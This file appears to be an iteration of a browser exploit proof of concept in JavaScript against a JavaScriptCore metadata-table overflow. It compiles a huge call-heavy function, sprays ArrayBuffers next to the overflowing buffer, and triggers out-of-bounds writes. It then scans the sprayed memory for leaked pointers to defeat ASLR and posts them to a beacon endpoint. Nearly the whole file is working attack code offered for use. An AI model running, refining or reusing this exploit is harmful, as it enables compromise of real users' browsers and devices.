// p150c — MetadataTable overflow: post-compilation spray
//
// p150b failed: spray before compilation → holes consumed by 146MB script blob.
// OVF-SUMMARY showed str:0, ab:0 — spray not adjacent to metadata buffer.
//
// FIX: Spray AFTER compilation. The metadata buffer (~100KB) exists after
// script.onload. Spray 100KB ArrayBuffers at that point → allocator
// places them near the metadata buffer in marge bitfit pages.
//
// Then call the function. Entries 0-893 are in-bounds (100096/112 = 893).
// Entry 894+ writes 112 bytes FORWARD past the buffer into adjacent spray ABs.
//
// LLInt reads OOB metadata → hits zeros in our AB → CallLinkInfo cache miss →
// slow path resolves target → WRITES real pointer back into the entry →
// that entry is inside our spray AB → scan for non-zero bytes = ASLR leak.
//
// Beacon prefix: V150C-

(function() {
  var BOOT_MS = Date.now();
  function B(tag, body) {
    var url = '/beacon/V150C-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }
  function hex8(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var BUF_SZ = 100096;
  var N = 38348816;
  var SPRAY_N = 200;
  var THROW_AT = 1500;

  // ---- PHASE 1: Compile the 38M op_call function ----
  // Do NOT spray yet — compilation allocates 146MB which trashes the heap
  B('BUILD-START');

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p150fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p150ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(url);
    if (!window.__p150ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');
    // Metadata buffer (~100KB) now exists in the heap
    // Give GC a moment to clean up compilation temporaries
    setTimeout(phaseSpray, 500);
  };
  document.head.appendChild(sc);
  sc.src = url;

  // ---- PHASE 2: Spray AFTER compilation ----
  var sprays = [];
  var sprayViews = [];
  var keptIndices = [];

  function phaseSpray() {
    B('SPRAY-START');

    // Spray 200 × 100KB zeroed ArrayBuffers
    // These should land near the metadata buffer in marge bitfit pages
    for (var i = 0; i < SPRAY_N; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      sprays.push(ab);
      sprayViews.push(new Uint8Array(ab));
    }
    B('SPRAY-' + SPRAY_N);

    // Keep all of them — we want density around the metadata buffer
    for (var i = 0; i < SPRAY_N; i++) keptIndices.push(i);

    // Wait briefly for allocator to settle, then execute
    setTimeout(phaseCall, 200);
  }

  // ---- PHASE 3: Execute with throwing callback ----
  function phaseCall() {
    B('CALL-START-T' + THROW_AT);

    var callCount = 0;
    var threw = false;

    try {
      window.__p150fn(function() {
        callCount++;
        if (callCount === 100) B('M100');
        if (callCount === 500) B('M500');
        if (callCount === 893) B('M893-LAST-INBOUNDS');
        if (callCount === 894) B('M894-FIRST-OOB');
        if (callCount === 900) B('M900');
        if (callCount === 1000) B('M1000');
        if (callCount === 1200) B('M1200');

        if (callCount >= THROW_AT) {
          threw = true;
          throw new Error('p150c-bail');
        }
      });
      B('COMPLETED-ALL-' + callCount);
    } catch (e) {
      B('THREW-' + callCount);
    }

    if (callCount > 0) {
      B('TOTAL-' + callCount);
      setTimeout(phaseScan, 100);
    } else {
      B('NO-CALLS');
    }
  }

  // ---- PHASE 4: Scan spray ABs for non-zero values ----
  function phaseScan() {
    B('SCAN-START');

    var hitABs = 0;
    var totalNonZero = 0;

    for (var ki = 0; ki < keptIndices.length; ki++) {
      var idx = keptIndices[ki];
      var view = sprayViews[idx];
      if (!view) continue;

      // Quick scan: check every 112-byte entry's first 8 bytes
      var nonZeroEntries = 0;
      var firstHitOffset = -1;
      for (var e = 0; e + 112 <= view.length; e += 112) {
        var hasData = false;
        for (var c = e; c < e + 8; c++) {
          if (view[c] !== 0) { hasData = true; break; }
        }
        if (hasData) {
          nonZeroEntries++;
          if (firstHitOffset === -1) firstHitOffset = e;
        }
      }

      if (nonZeroEntries > 0) {
        hitABs++;
        B('HIT-' + idx + '-entries=' + nonZeroEntries + '-first=' + firstHitOffset);

        // Dump first 5 non-zero 112-byte entries
        var dumped = 0;
        for (var e2 = 0; e2 + 112 <= view.length && dumped < 5; e2 += 112) {
          var hasData2 = false;
          for (var c2 = e2; c2 < e2 + 8; c2++) {
            if (view[c2] !== 0) { hasData2 = true; break; }
          }
          if (!hasData2) continue;
          dumped++;

          // Extract 8-byte values at 8-byte aligned offsets (potential pointers)
          var ptrs = '';
          for (var p = 0; p < 112; p += 8) {
            var anyNZ = false;
            for (var v = 0; v < 8; v++) {
              if (view[e2 + p + v] !== 0) { anyNZ = true; break; }
            }
            if (anyNZ) {
              // Little-endian pointer reconstruction
              var hex = '';
              for (var h = 7; h >= 0; h--) hex += hexByte(view[e2 + p + h]);
              ptrs += 'o' + p + ':' + hex + ' ';
            }
          }
          if (ptrs) B('P' + idx + '@' + e2, ptrs.trim());
        }

        // Full byte count
        var totalNZ = 0;
        for (var j = 0; j < view.length; j++) {
          if (view[j] !== 0) totalNZ++;
        }
        totalNonZero += totalNZ;
        B('NZ-' + idx + '-' + totalNZ);
      }
    }

    B('DONE-hits=' + hitABs + '-nz=' + totalNonZero);

    if (hitABs === 0) {
      B('NO-HITS');
      // Diagnostic: scan for ANY non-zero in any spray
      var anyNZ = false;
      for (var d = 0; d < keptIndices.length && !anyNZ; d++) {
        var dv = sprayViews[keptIndices[d]];
        if (!dv) continue;
        for (var dj = 0; dj < dv.length; dj++) {
          if (dv[dj] !== 0) {
            anyNZ = true;
            B('DIAG-NZ-AB' + keptIndices[d] + '-OFF' + dj + '-VAL' + dv[dj]);
            break;
          }
        }
      }
      if (!anyNZ) B('DIAG-ALL-ZERO');
    }
  }
})();
